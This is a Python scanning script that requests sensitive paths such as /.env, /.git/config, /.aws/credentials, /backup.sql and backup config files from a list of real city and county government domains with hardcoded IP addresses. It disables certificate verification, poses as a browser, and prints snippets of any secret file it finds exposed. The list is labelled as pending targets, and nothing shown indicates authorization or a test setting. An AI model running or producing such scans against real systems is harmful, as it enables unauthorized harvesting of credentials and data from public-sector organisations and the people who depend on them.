import socket, ssl, time

def check_secret(ip, host, ep, port=443):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = socket.socket()
        s.settimeout(4)
        s.connect((ip, port))
        ss = ctx.wrap_socket(s, server_hostname=host)
        req = 'GET ' + ep + ' HTTP/1.1\r\nHost: ' + host + '\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n'
        ss.send(req.encode())
        resp = ss.recv(2048).decode('latin-1', errors='replace')
        code = resp.split('\r\n')[0]
        # Get content length and snippet
        clen = ''
        for l in resp.split('\r\n'):
            if l.lower().startswith('content-length:'):
                clen = l.split(':', 1)[1].strip()
        body = resp.split('\r\n\r\n', 1)[1][:200] if '\r\n\r\n' in resp else ''
        ss.close()
        return code, clen, body[:100]
    except Exception as e:
        return 'ERROR', '', str(e)[:60]

def check_http(ip, host, ep, port=80):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, port))
        req = 'GET ' + ep + ' HTTP/1.1\r\nHost: ' + host + '\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n'
        s.send(req.encode())
        resp = s.recv(2048).decode('latin-1', errors='replace')
        code = resp.split('\r\n')[0]
        clen = ''
        for l in resp.split('\r\n'):
            if l.lower().startswith('content-length:'):
                clen = l.split(':', 1)[1].strip()
        body = resp.split('\r\n\r\n', 1)[1][:200] if '\r\n\r\n' in resp else ''
        s.close()
        return code, clen, body[:100]
    except Exception as e:
        return 'ERROR', '', str(e)[:60]

# Pending targets with IPs
targets = [
    ('acworth.org', '213.165.236.104'),
    ('ardmorecity.org', '208.90.191.118'),
    ('suffolkva.us', '166.62.42.178'),
    ('anchorage.gov', None),  # DNS failed
    ('wichita.gov', '8.14.206.137'),
    ('desmoines.gov', None),  # DNS failed
    ('stpaul.gov', '54.165.146.83'),
    ('columbus.gov', '52.247.170.120'),
]

secrets = ['/.env', '/.git/config', '/.aws/credentials', '/.aws/config', '/backup.sql', '/.config/db.yml', '/robots.txt', '/wp-config.php.bak', '/.htaccess', '/web.config']

for name, ip in targets:
    if not ip:
        print('\n=== ' + name + ' (NO IP) ===')
        print('  SKIPPED — DNS resolution failed')
        continue
    
    print('\n=== ' + name + ' (' + ip + ') ===')
    
    for ep in secrets:
        # Try HTTPS first
        code, clen, body = check_secret(ip, name, ep)
        if code != 'ERROR' and '200' in code:
            print('  HTTPS ' + ep + ' -> ' + code + ' [' + clen + ' bytes] ' + body[:60])
        elif code != 'ERROR' and '301' not in code and '302' not in code and '404' not in code and '403' not in code:
            print('  HTTPS ' + ep + ' -> ' + code)
        time.sleep(0.3)
        
        # Try HTTP
        code80, clen80, body80 = check_http(ip, name, ep)
        if code80 != 'ERROR' and '200' in code80:
            print('  HTTP  ' + ep + ' -> ' + code80 + ' [' + clen80 + ' bytes] ' + body80[:60])
        time.sleep(0.2)

print('\n[DONE]')
